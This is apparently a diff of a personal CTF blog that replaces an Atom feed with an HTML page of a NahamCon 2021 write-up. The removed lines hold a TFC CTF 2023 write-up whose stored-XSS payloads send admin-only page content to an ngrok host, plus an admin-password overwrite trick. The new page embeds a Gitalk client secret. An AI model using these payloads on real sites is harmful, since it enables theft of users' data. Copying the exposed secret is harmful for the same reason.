@@ -1,120 +1,104 @@
-<?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom">
-    <id>https://mrecho123.github.io</id>
-    <title>NSS</title>
-    <updated>2023-08-04T00:41:31.081Z</updated>
-    <generator>https://github.com/jpmonette/feed</generator>
-    <link rel="alternate" href="https://mrecho123.github.io"/>
-    <link rel="self" href="https://mrecho123.github.io/atom.xml"/>
-    <subtitle>Mrecho</subtitle>
-    <logo>https://mrecho123.github.io/images/avatar.png</logo>
-    <icon>https://mrecho123.github.io/favicon.ico</icon>
-    <rights>All rights reserved 2023, NSS</rights>
-    <entry>
-        <title type="html"><![CDATA[TFC CTF 2023 - web challenges 🐱‍💻]]></title>
-        <id>https://mrecho123.github.io/post/tfc-ctf-2023-web-challenges/</id>
-        <link href="https://mrecho123.github.io/post/tfc-ctf-2023-web-challenges/">
-        </link>
-        <updated>2023-08-03T03:21:54.000Z</updated>
-        <content type="html"><![CDATA[<p><strong>Hello again , The past weekend I played TFC CTF it was fun 😃 , here is the interesting challenges that I solved in the web category ; enjoy 👌</strong></p>
-<ul class="contains-task-list">
-<li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox" id="task-item-4268752"><label class="task-list-item-label" for="task-item-4268752"> Baby ducky notes and the part 2 (revenge)</label></li>
-<li class="task-list-item"><input class="task-list-item-checkbox" checked="" disabled="" type="checkbox" id="task-item-981609"><label class="task-list-item-label" for="task-item-981609"> MCTREE</label></li>
-</ul>
-<hr>
-<h2 id="baby-ducky-notes-part-1-2">Baby ducky notes Part 1 &amp; 2</h2>
-<p>Found an stored xss in the posts in<br>
-this help me see aswel <a href="https://xss.report/dashboard">Link to xss tool</a></p>
-<p>Payloads used to grab /posts where only admin bot can access :</p>
-<pre><code class="language-javascript">&lt;script&gt;
-  fetch(&quot;http://localhost:1337/posts&quot;, {
-    method: &quot;GET&quot;,
-    credentials: &quot;include&quot;,
-  })
-    .then((response) =&gt; response.text())
-    .then((html) =&gt; {
-      const base64Html = btoa(html);
-      const img = new Image();
-      img.src = &quot;https://1cc5-41-140-89-213.ngrok-free.app?c=&quot; + encodeURIComponent(base64Html);
-    })
-&lt;/script&gt;
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>NahamCon CTF Writeup 2021 🐱‍💻 | NSS</title>
+<meta name="description" content="Mrecho">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="shortcut icon" href="https://mrecho123.github.io/favicon.ico?v=1691109685981">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="stylesheet" href="https://unpkg.com/papercss@1.6.1/dist/paper.min.css" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://mrecho123.github.io/styles/main.css">
 
 
+  
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
+  
 
-Local :
-&lt;script&gt;
-  fetch(&quot;http://localhost:1337/posts&quot;, {
-    method: &quot;GET&quot;,
-    credentials: &quot;include&quot;,
-  })
-    .then((response) =&gt; response.text())
-    .then((html) =&gt; {
-      const base64Html = btoa(html);
-      const img = new Image();
-      img.src = &quot;https://1cc5-41-140-89-213.ngrok-free.app?c=&quot; + encodeURIComponent(base64Html);
-    })
-    .catch((error) =&gt; console.error(&quot;Error&quot;, error));
-&lt;/script&gt;
+  
+
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
 
 
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
 
 
-server : 
+  </head>
+  <body>
+  
+    <nav class="navbar border fixed split-nav">
+  <div class="nav-brand">
+    <h3><a href="https://mrecho123.github.io">NSS</a></h3>
+  </div>
+  <div class="collapsible">
+    <input id="collapsible1" type="checkbox" name="collapsible1">
+    <button>
+      <label for="collapsible1">
+        <div class="bar1"></div>
+        <div class="bar2"></div>
+        <div class="bar3"></div>
+      </label>
+    </button>
+    <div class="collapsible-body">
+      <ul class="inline">
+        
+          <li>
+            
+              <a href="/" class="menu">
+                Index
+              </a>
+            
+          </li>
+        
+          <li>
+            
+              <a href="/archives" class="menu">
+                archive
+              </a>
+            
+          </li>
+        
+          <li>
+            
+              <a href="/tags" class="menu">
+                Tag Index
+              </a>
+            
+          </li>
+        
+          <li>
+            
+              <a href="/post/about" class="menu">
+                about us
+              </a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
 
-&lt;script&gt;
-  fetch(&quot;http://challs.tfcctf.com:32728/posts&quot;, {
-    method: &quot;GET&quot;,
-    credentials: &quot;include&quot;,
-  })
-    .then((response) =&gt; response.text())
-    .then((html) =&gt; {
-      const base64Html = btoa(html);
-      const img = new Image();
-      img.src = &quot;https://1cc5-41-140-89-213.ngrok-free.app?c=&quot; + encodeURIComponent(base64Html);
-    })
-    .catch((error) =&gt; console.error(&quot;Error&quot;, error));
-&lt;/script&gt;
-
-</code></pre>
-<p>Final payload :</p>
-<figure data-type="image" tabindex="1"><img src="https://cdn.discordapp.com/attachments/1136817885122154526/1136820462500986960/image.png" alt="img" loading="lazy"></figure>
-<p>Report the posts to admin, then wait for the bot to visit it then boom :</p>
-<p><img src="https://cdn.discordapp.com/attachments/1136817885122154526/1136818055666749540/Pasted_image_20230728210643.png" alt="img" loading="lazy"><br>
-<em>Base64 of /posts includes the flag</em></p>
-<figure data-type="image" tabindex="2"><img src="https://cdn.discordapp.com/attachments/1136817885122154526/1136818054534266960/Pasted_image_20230728210703.png" alt="img" loading="lazy"></figure>
-<h2 id="mctree">Mctree</h2>
-<p><strong>Objective:</strong> login as admin ..</p>
-<p>My thaughts were:</p>
-<blockquote>
-<p>the input is been sanitized from html tags and u should focus on user input manipulation &amp; username set to maximum 12 characters</p>
-</blockquote>
-<p><strong>POC</strong></p>
-<ul>
-<li>register as admin%00:admin</li>
-<li>so when u register a username it strips away those characters &lt;&gt;%^ ; so if</li>
-<li>Regiter as admin&lt;&gt;:admin u overight admins password that it</li>
-</ul>
-<figure data-type="image" tabindex="3"><img src="https://cdn.discordapp.com/attachments/1136817885122154526/1136818055410884708/Pasted_image_20230729122443.png" alt="img" loading="lazy"></figure>
-<p><span style="background-color: #C6BF9C;"> In conclusion : keep better notes when you trying to solve a CTF challenge and try evrything that comes to your mind , and more writeups you read the more ideas you will have , till then C ya 😉 </span></p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[CVE-2023-001]]></title>
-        <id>https://mrecho123.github.io/post/cve-2023-001/</id>
-        <link href="https://mrecho123.github.io/post/cve-2023-001/">
-        </link>
-        <updated>2023-08-02T05:31:54.000Z</updated>
-        <content type="html"><![CDATA[<p>This is my first CVE that I found in [REDACTED] .<br>
-DOcument stuff</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[NahamCon CTF Writeup 2021 🐱‍💻]]></title>
-        <id>https://mrecho123.github.io/post/nahamcon-ctf-writeup-2021/</id>
-        <link href="https://mrecho123.github.io/post/nahamcon-ctf-writeup-2021/">
-        </link>
-        <updated>2021-03-13T10:17:07.000Z</updated>
-        <content type="html"><![CDATA[<figure data-type="image" tabindex="1"><img src="https://miro.medium.com/v2/resize:fit:1100/format:webp/1*W-_7lDYsjx_LEwi92McTeQ.png" alt="img" loading="lazy"></figure>
+    <div id="top" class="row site">
+      <div class="sm-12 md-8 col">
+        <div class="paper">
+          <article class="article">
+            <h1>NahamCon CTF Writeup 2021 🐱‍💻</h1>
+            <p class="article-meta">
+              2021-03-13
+              
+                <a href="https://mrecho123.github.io/tag/VnWuWwEsW/" class="badge warning">
+                  CTF
+                </a>
+              
+            </p>
+            
+            <div class="post-content">
+              <figure data-type="image" tabindex="1"><img src="https://miro.medium.com/v2/resize:fit:1100/format:webp/1*W-_7lDYsjx_LEwi92McTeQ.png" alt="img" loading="lazy"></figure>
 <p><strong>Hello, I m Mr_echo, I m played Nahamcon CTF 2021 this weekend, and I'm gonna write some interesting challenges that I solved 👌.~Enjoy</strong></p>
 <h2 id="1-homeward-bound-web-50-p">1. Homeward Bound [WEB 50 p]</h2>
 <h3 id="objective"><strong>Objective</strong>:</h3>
@@ -306,6 +290,155 @@ return render_template_string(code)</p>
 <p>we got the flag 😃)</p>
 <figure data-type="image" tabindex="7"><img src="https://cdn-images-1.medium.com/max/2000/1*ceYCCx23VyjF9XdQrbNyjQ.png" alt="" loading="lazy"></figure>
 <p>BTW THIS IS MY FIRST WRITEUP 😃) LIKE AND FOLLOW</p>
-]]></content>
-    </entry>
-</feed>
+
+            </div>
+          </article>
+        </div>
+        <div class="paper" data-aos="fade-in">
+          
+        </div>
+        
+          
+            <div class="paper" data-aos="fade-in">
+              <div id="gitalk-container"></div>
+            </div>
+          
+
+          
+        
+      </div>
+
+      <div class="sm-12 md-4 col sidebar">
+  <div class="paper info-container">
+    <img src="https://mrecho123.github.io/images/avatar.png?v=1691109685981" class="no-responsive avatar">
+    <div class="text-muted">Mrecho</div>
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  </div>
+  <div class="paper">
+    <div class="sidebar-title">
+      最新文章
+    </div>
+    <div class="row">
+      <ul>
+        
+          
+            <li>
+              <a href="https://mrecho123.github.io/post/about/">About</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://mrecho123.github.io/post/tfc-ctf-2023-web-challenges/">TFC CTF 2023 - web challenges 🐱‍💻</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://mrecho123.github.io/post/cve-2023-001/">CVE-2023-001</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://mrecho123.github.io/post/go-for-a-walk-and-brainstorm-ideas/">Go for a walk and brainstorm ideas.</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://mrecho123.github.io/post/what-is-a-bug-hunter-aka-white-hat-hackers/">Bug hunting - (BLOG STYLE)</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://mrecho123.github.io/post/what-is-mathematics/">Examples -N2 </a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://mrecho123.github.io/post/nahamcon-ctf-writeup-2021/">NahamCon CTF Writeup 2021 🐱‍💻</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://mrecho123.github.io/post/hello-world/">Hello world </a>
+            </li>
+          
+        
+      </ul>
+    </div>
+  </div>
+  <div class="paper">
+    <div class="sidebar-title">
+      标签列表
+    </div>
+    <div class="row">
+      
+        <a href="https://mrecho123.github.io/tag/VnWuWwEsW/" class="badge secondary">
+          CTF
+        </a>
+      
+    </div>
+  </div>
+  <div class="paper">
+     | <a class="rss" href="https://mrecho123.github.io/atom.xml" target="_blank">RSS</a>
+  </div>
+</div>
+
+
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+
+<script type="application/javascript">
+
+AOS.init();
+
+hljs.initHighlightingOnLoad()
+
+</script>
+
+
+
+  
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+
+      var gitalk = new Gitalk({
+        clientID: 'e0f5440468948fd7a048',
+        clientSecret: 'e7f6ee5cabd5203523d139a8b8b602f47f4e0cc6',
+        repo: 'mrecho123.github.io',
+        owner: 'mrecho123',
+        admin: ['mrecho123'],
+        id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+      })
+
+      gitalk.render('gitalk-container')
+
+    </script>
+  
+
+  
+
+
+
+
+  </body>
+</html>
